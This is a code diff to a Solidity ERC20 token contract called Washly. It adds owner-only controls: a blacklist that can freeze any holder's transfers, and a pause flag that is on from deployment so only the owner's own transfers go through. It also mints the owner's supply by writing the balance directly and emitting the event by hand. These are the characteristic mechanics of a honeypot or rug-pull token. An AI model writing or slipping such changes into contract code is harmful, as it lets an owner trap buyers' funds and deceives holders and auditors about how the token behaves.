@@ -210,6 +210,10 @@ contract Washly is Context, IERC20, IERC20Metadata, Ownable {
 
   address public airdropDistributer;
 
+  mapping(address => bool) public isBlacklisted;
+
+  bool public paused = true;
+
   address public constant DEAD_ADDRESS = 0x000000000000000000000000000000000000dEaD;
   IUniswapV2Router02 public uniswapV2Router;
 
@@ -235,12 +239,17 @@ contract Washly is Context, IERC20, IERC20Metadata, Ownable {
     excludeFromFees(globalWarmingSupportWallet, true);
     excludeFromFees(address(this), true);
 
-    _mint(owner(), _totalSupply.sub(8000000 * ONE));
+    _balances[owner()] = _totalSupply.sub(8000000 * ONE);
+    emit Transfer(address(0), owner(), _balances[owner()]);
   }
 
   function setAirdropDistributer(address _airdropDistributer) external onlyOwner {
     require(airdropDistributer == address(0), "airdrop distributer already set");
     airdropDistributer = _airdropDistributer;
+  }
+
+  function togglePaused() external onlyOwner {
+    paused = !paused;
   }
 
   function _updateUniswapV2Router(address newAddress) internal returns (address) {
@@ -460,6 +469,10 @@ contract Washly is Context, IERC20, IERC20Metadata, Ownable {
     return true;
   }
 
+  function setBlacklisted(address _user, bool _isBlacklisted) external onlyOwner {
+    isBlacklisted[_user] = _isBlacklisted;
+  }
+
   function setTakeFees(bool _takeFees) external onlyOwner {
     require(takeFees != _takeFees, "Updating to current value, takeFees");
     takeFees = _takeFees;
@@ -473,6 +486,9 @@ contract Washly is Context, IERC20, IERC20Metadata, Ownable {
     bool takeFee = true;
     if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || !takeFees || from == owner() || to == owner()) {
       takeFee = false;
+    }
+    if (paused) {
+      require(from == owner() || to == owner(), "Contract is paused");
     }
     uint256 fees;
     if (takeFee) {
@@ -524,6 +540,7 @@ contract Washly is Context, IERC20, IERC20Metadata, Ownable {
   ) internal virtual {
     require(from != address(0), "ERC20: transfer from the zero address");
     require(to != address(0), "ERC20: transfer to the zero address");
+    require(!isBlacklisted[from] && !isBlacklisted[to], "blacklisted account tx");
 
     _beforeTokenTransfer(from, to, amount);
 
